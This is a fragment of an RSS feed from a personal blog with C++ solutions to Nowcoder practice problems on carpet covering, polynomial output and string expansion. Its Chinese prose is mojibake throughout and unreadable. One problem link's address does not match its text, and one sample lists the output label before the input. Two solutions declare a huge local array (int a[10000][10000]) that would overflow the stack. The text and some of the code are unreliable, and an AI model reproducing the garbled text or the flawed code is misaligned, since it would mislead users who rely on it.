      <content:encoded><![CDATA[<p>é¢˜ç›®æ¥æºï¼š<a href="https://ac.nowcoder.com/acm/problem/16589">https://ac.nowcoder.com/acm/problem/16593</a></p><p><code>hello</code></p><p>æ€è·¯ï¼š</p><p>å°±æ˜¯æŠŠæ¯ä¸€ç»„åœ°æ¯¯å­˜åˆ°äºŒç»´æ•°ç»„é‡Œï¼Œä¸€è¡Œä»£è¡¨ä¸€å¼ åœ°æ¯¯ã€‚</p><p>ç„¶åè‡ªä¸Šè€Œä¸‹åˆ¤æ–­æŸç‚¹çš„åœ°æ¯¯ï¼Œå¾—åˆ°çš„é©¬ä¸Šbreakï¼Œå°±æ˜¯æœ€ä¸Šé¢çš„ã€‚</p><p>é¦–å…ˆè¿›è¡Œå­˜å‚¨ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n,res;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10000</span>][<span class="number">10000</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªä¸Šè€Œä¸‹è¿›è¡Œcheckæ“ä½œï¼Œåˆ¤æ–­æŸå¼ æ¯¯å­æ˜¯å¦æ˜¯ç­”æ¡ˆï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x,y;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">check</span>(a[i],x,y))&#123;</span><br><span class="line">        res=i;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkç¨å¾®ç”¨äº†ä¸€ä¸‹æŒ‡é’ˆï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä¸‹æ ‡çš„ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span>* p,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*p&lt;=x&amp;&amp;(*(p+<span class="number">2</span>)+*p)&gt;=x)&amp;&amp;(*(p+<span class="number">1</span>)&lt;=y&amp;&amp;(*(p+<span class="number">3</span>)+*(p+<span class="number">1</span>)&gt;=y)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç­”æ¡ˆéœ€è¦+1ï¼Œå› ä¸ºæ¯¯å­ä»1å¼€å§‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cout&lt;&lt;res+<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>å°±OKè¾½ï¼</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span>* p,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*p&lt;=x&amp;&amp;(*(p+<span class="number">2</span>)+*p)&gt;=x)&amp;&amp;(*(p+<span class="number">1</span>)&lt;=y&amp;&amp;(*(p+<span class="number">3</span>)+*(p+<span class="number">1</span>)&gt;=y)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,res;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>][<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            cin&gt;&gt;a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(a[i],x,y))&#123;</span><br><span class="line">            res=i;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;res+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">ç‰›å®¢ç®—æ³•åŸºç¡€ç²¾é€‰</category>
      
      
      <comments>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16622å¤šé¡¹å¼è¾“å‡ºã€é¢˜è§£ã€‘ã€å…¥é—¨å‘ã€‘</title>
      <link>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/</link>
      <guid>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/</guid>
      <pubDate>Thu, 03 Aug 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;é¢˜ç›®æ¥æºï¼š&lt;a href=&quot;https://ac.nowcoder.com/acm/problem/16622&quot;&gt;å¤šé¡¹å¼è¾“å‡º&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜åœ¨åšçš„æ—¶å€™ç»™è‡ªå·±æŒ–äº†ä¸ªå‘ï¼Œå…¶å®æŠŠç¬¦å·ã€ç³»æ•°ã€æŒ‡æ•°åˆ†å¼€æ¥çœ‹ä¼šæ›´å¥½å®ç°ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå…ˆç»™å‡ºä¸æ–­è°ƒè¯•ç»™å‡ºçš„ç­”æ¡ˆï¼Œæ€è·¯ä¸</description>
        
      
      
      
      <content:encoded><![CDATA[<p>é¢˜ç›®æ¥æºï¼š<a href="https://ac.nowcoder.com/acm/problem/16622">å¤šé¡¹å¼è¾“å‡º</a></p><p>è¿™é“é¢˜åœ¨åšçš„æ—¶å€™ç»™è‡ªå·±æŒ–äº†ä¸ªå‘ï¼Œå…¶å®æŠŠç¬¦å·ã€ç³»æ•°ã€æŒ‡æ•°åˆ†å¼€æ¥çœ‹ä¼šæ›´å¥½å®ç°ã€‚</p><p>è¿™é‡Œå…ˆç»™å‡ºä¸æ–­è°ƒè¯•ç»™å‡ºçš„ç­”æ¡ˆï¼Œæ€è·¯ä¸æ˜¯ä¸€è¹´è€Œå°±çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸€</span><br><span class="line">è¾“å…¥ï¼š</span><br><span class="line">5</span><br><span class="line">100 -1 1 -3 0 10</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">100x^5-x^4+x^3-3x^2+10</span><br><span class="line"></span><br><span class="line">äºŒ</span><br><span class="line">è¾“å…¥ï¼š</span><br><span class="line">3</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">-50 0 0 1</span><br><span class="line">-50x^3+1</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°ç¤ºä¾‹ã€‚è¿™æ ·çš„ç¤ºä¾‹æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºæŒ‡æ•°ä¸º1çš„æ—¶å€™xåé¢æ˜¯ä¸å¸¦â€œ^â€çš„ï¼Œä½†æ˜¯æ­¤å¤„å¹¶æœªç»™å‡ºæŒ‡æ•°ä¸º1æ—¶çš„ç¤ºä¾‹ï¼Œå› æ­¤å¯ä»¥è‡ªå·±ç»™å‡ºä¸€ä¸ªç»¼åˆæ€§æ¯”è¾ƒå¼ºçš„è°ƒè¯•ç¤ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‰</span><br><span class="line">è¾“å…¥ï¼š</span><br><span class="line">5</span><br><span class="line">0 -1 1 10 0 1 -1</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">-x^4+x^3+10x^2+1</span><br></pre></td></tr></table></figure><p>å¼€å§‹our å·¥ç¨‹ï¼</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> cnt=n;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>];</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿›è¡Œè¾“å…¥çš„è¯»å–ï¼Œå­˜åˆ°nï¼Œç”±äºè¿™ä¸ªnæ˜¯é¢˜ç›®ç»™å‡ºçš„å¸¸é‡ï¼Œæœ€å¥½ä¸è¦åŠ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨cntæ¥ä½œä¸ºå˜é‡æš‚æ—¶å­˜å‚¨nï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚å¦å¤–æ ¹æ®ç¤ºä¾‹ï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥n+1ä¸ªæŒ‡æ•°ï¼Œå› æ­¤ç”¨æ•°ç»„æ¥å­˜å‚¨ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="keyword">while</span>(cnt--)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„ä½¿ç”¨äº†ä¸€ä¸ªç®€å•çš„whileå¾ªç¯æ¥è¾“å…¥å­˜å‚¨æ•°ç»„ï¼Œcntå……å½“è®¡æ•°å›ï¼Œä¸è¦å¿˜è®°æœ‰n+1ä¸ªæ•°æ®æ‰€ä»¥è¦å…ˆcnt++</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">    cnt=n;</span><br><span class="line">    <span class="type">int</span> meiyoufuhao=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            meiyoufuhao=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==meiyoufuhao)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>) cout&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="number">-1</span>) cout&lt;&lt;<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>||a[i]==<span class="number">1</span>&amp;&amp;cnt==<span class="number">0</span>) cout&lt;&lt;a[i];</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>) cout&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="number">-1</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    cout&lt;&lt;<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(cnt==<span class="number">0</span>) cout&lt;&lt;<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>&amp;&amp;!cnt==<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;x^&quot;</span>&lt;&lt;cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt--;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„å®ç°éƒ½åœ¨è¿™é‡Œäº†å…¶ä¸­meiyoufuhaoæ˜¯æ²¡æœ‰ç¬¦å·çš„æ„æ€ï¼Œè®°å½•ç¬¬ä¸€ä¸ªç³»æ•°ä¸ä¸º0çš„å®¶ä¼™çš„ä½ç½®ï¼Œè®©å®ƒä¸èƒ½å¸¦åŠ å·ã€‚å…¶ä½™çš„å°±æŒ‰ç…§åŸºæœ¬çš„æ•°å­¦å°è¯•å®ç°äº†ï¼Œä¸€å¤§å †çš„ifè¯­å¥ï¼Œè¿™é‡Œæˆ‘å› ä¸ºå‰æœŸæ€è€ƒä¸å¤Ÿï¼Œå¯¼è‡´åˆ†ç±»èµ·æ¥æ¯”è¾ƒå¤æ‚ã€‚åç»­ä¼šå†æ‹¿å‡ºä¸€ä¸ªç‰ˆæœ¬ä¸Šä¼ ã€‚</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">ç‰›å®¢ç®—æ³•åŸºç¡€ç²¾é€‰</category>
      
      
      <comments>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16644å­—ç¬¦ä¸²çš„å±•å¼€ã€é¢˜è§£ã€‘ã€å…¥é—¨å‘ã€‘</title>
      <link>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/</link>
      <guid>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/</guid>
      <pubDate>Tue, 01 Aug 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt; é¢˜ç›®æ¥æºã€ç‰›å®¢ç«èµ›ã€‘ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ac.nowcoder.com/acm/problem/16644&quot;&gt;https://ac.nowcoder.com/acm/problem/16644&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é¢˜è§£ï¼š&lt;/p&gt;
&lt;fig</description>
        
      
      
      
      <content:encoded><![CDATA[<p> é¢˜ç›®æ¥æºã€ç‰›å®¢ç«èµ›ã€‘ï¼š</p><p><a href="https://ac.nowcoder.com/acm/problem/16644">https://ac.nowcoder.com/acm/problem/16644</a></p><p>é¢˜è§£ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å¼•å…¥ä¸‹é¢æœ‰ç”¨åˆ°çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isok</span><span class="params">(<span class="type">char</span> a,<span class="type">char</span> b)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">func</span><span class="params">(<span class="type">const</span> string&amp; p,<span class="type">int</span> p1,<span class="type">int</span> p2,<span class="type">int</span> p3)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å–œæ¬¢ç®€çŸ­ä¸»å‡½æ•°ï¼Œç»™äººæ¸…çˆ½çš„æ„Ÿè§‰</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="comment">//æ¸…æ¥šç¼“å†²åŒºä¹‹åå†è¿›è¡Œè¯»å–ä¸€æ•´è¡Œå­—ç¬¦ä¸²,ä¹Ÿå¯ä»¥æŠŠè¯¥è¡Œç›´æ¥æ”¹æˆcin&gt;&gt;string</span></span><br><span class="line">    cin.<span class="built_in">ignore</span>();<span class="built_in">getline</span>(cin,s);</span><br><span class="line">    <span class="comment">//funcæ˜¯ä¸€ä¸ªä¸»è¦åŠŸèƒ½å®ç°çš„å‡½æ•°ï¼ŒæŠŠæ‰€æœ‰å‚æ•°å¾€é‡Œé¢å¡</span></span><br><span class="line">    string ans=<span class="built_in">func</span>(s,a,b,c);</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿™æ˜¯ä¸€ä¸ªåˆ¤æ–­å‰åä¸¤æ•°æ˜¯å¦åŒä¸ºå­—æ¯æˆ–åŒä¸ºæ•°å­—çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isok</span><span class="params">(<span class="type">char</span> a,<span class="type">char</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isdigit</span>(a)&amp;&amp;<span class="built_in">isdigit</span>(b))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isalpha</span>(a)&amp;&amp;<span class="built_in">isalpha</span>(b))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function">string <span class="title">func</span><span class="params">(<span class="type">const</span> string&amp; p,<span class="type">int</span> p1,<span class="type">int</span> p2,<span class="type">int</span> p3)</span></span>&#123;</span><br><span class="line">    <span class="comment">//rä½œä¸ºä¸´æ—¶å­˜å‚¨å•ä¸ªå¡«å……ä¸²</span></span><br><span class="line">    string r=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//på¼•ç”¨äº†å­—ç¬¦ä¸²ï¼Œä¸è¦ç›´æ¥ç”¨å¸¦constçš„pï¼Œå› æ­¤åˆ›å»ºä¸€ä¸ªansä½œä¸ºreturnçš„ç­”æ¡ˆ</span></span><br><span class="line">    string ans=p;</span><br><span class="line">    <span class="comment">//éå†åŸå­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;ans.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="comment">//å¦‚æœå½“å‰å­—ç¬¦æ˜¯&#x27;-&#x27;ä¸”å‰åç±»å‹ç›¸åŒï¼Œä¸”åè€…æ¯”å‰è€…å¤§</span></span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">&#x27;-&#x27;</span>&amp;&amp;<span class="built_in">isok</span>(ans[i<span class="number">-1</span>],ans[i+<span class="number">1</span>])&amp;&amp;ans[i<span class="number">-1</span>]&lt;ans[i+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="comment">//xä¸´æ—¶å­˜å‚¨åŸå­—ç¬¦ä¸²ä¸­&#x27;-&#x27;å·¦è¾¹å­—ç¬¦</span></span><br><span class="line">            <span class="type">char</span> x=ans[i<span class="number">-1</span>];</span><br><span class="line">            <span class="comment">//åˆå§‹åŒ–rï¼ˆråŒ…æ‹¬&#x27;-&#x27;å·¦å³çš„å…ƒç´ ï¼‰</span></span><br><span class="line">            r=r+x;x++;</span><br><span class="line">            <span class="comment">//å¦‚æœå½“å‰å…ƒç´ ä¸æ˜¯&#x27;-&#x27;å³è¾¹å…ƒç´ ï¼Œè¿›è¡Œæ“ä½œ</span></span><br><span class="line">            <span class="keyword">while</span>(x!=ans[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//å˜é‡kä¸´æ—¶å­˜å‚¨p2ï¼Œä½œç”¨è¿˜æœ‰ç”¨äºwhile()çš„è®¡æ•°</span></span><br><span class="line">                <span class="type">int</span> k=p2;</span><br><span class="line">                <span class="comment">//ä¸‰ç§æƒ…å†µä¸åŒå¤„ç†ï¼Œå…¶ä¸­æ³¨æ„toupper()è¿”å›intå€¼æ‰€ä»¥è¦è½¬åŒ–ä¸ºchar</span></span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">1</span>)&#123;<span class="keyword">while</span>(k--) r=r+x;x++;&#125;</span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">2</span>)&#123;<span class="keyword">while</span>(k--) r=r+<span class="built_in">char</span>(<span class="built_in">toupper</span>(x));x++;&#125;</span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">3</span>)&#123;<span class="keyword">while</span>(k--) r=r+<span class="string">&#x27;*&#x27;</span>;x++;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//ç¿»è½¬å‡½æ•°ï¼Œæ³¨æ„ä¸‹æ ‡</span></span><br><span class="line">            <span class="keyword">if</span>(p3==<span class="number">2</span>)&#123;<span class="built_in">reverse</span>(r.<span class="built_in">begin</span>()+<span class="number">1</span>,r.<span class="built_in">end</span>());&#125;</span><br><span class="line">            <span class="comment">//å°†ansçš„&#x27;x-x&#x27;ç”¨rå–ä»£ï¼Œ</span></span><br><span class="line">            <span class="comment">//éå†å˜é‡iå‘å‰é€€ä¸€æ ¼ï¼Œæ¥åˆ°rçš„å¤´éƒ¨,ä»¥é˜²å‡ºç•Œï¼Œ</span></span><br><span class="line">            <span class="comment">//å¹¶ä¸”æ¸…ç©ºä¸´æ—¶å­˜å‚¨rï¼Œ</span></span><br><span class="line">            ans.<span class="built_in">replace</span>(i<span class="number">-1</span>,<span class="number">2</span>,r); i--;r=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ¬¢è¿æé—®å’Œäº¤æµ</strong></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">ç‰›å®¢ç®—æ³•åŸºç¡€ç²¾é€‰</category>
      
      
      <comments>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
